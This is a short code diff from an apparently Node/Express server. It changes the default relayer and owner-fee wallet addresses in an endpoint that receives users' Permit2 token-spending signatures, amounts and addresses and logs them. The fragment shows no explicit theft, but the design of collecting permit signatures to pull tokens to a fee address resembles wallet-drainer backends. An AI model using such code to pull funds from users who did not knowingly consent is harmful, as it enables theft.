@@ -215,8 +215,8 @@ const chatSessionsStore: Record<string, ChatSessionData> = {};
 app.post("/api/permit2-pull/submit", async (req, res) => {
   try {
     const { token, amount, nonce, deadline, signature, userAddress, relayerContract, ownerFeeAddress } = req.body || {};
-    const finalRelayer = relayerContract || "0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091";
-    const finalOwner = ownerFeeAddress || "0xEfc5859335A58d64A5e8E01d02c5241c852CBD40";
+    const finalRelayer = relayerContract || "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+    const finalOwner = ownerFeeAddress || "0x70997970C51812dc3A010C7d01b50e0d17dc79C8";
 
     console.log("Received permit signature:", { 
       token, 
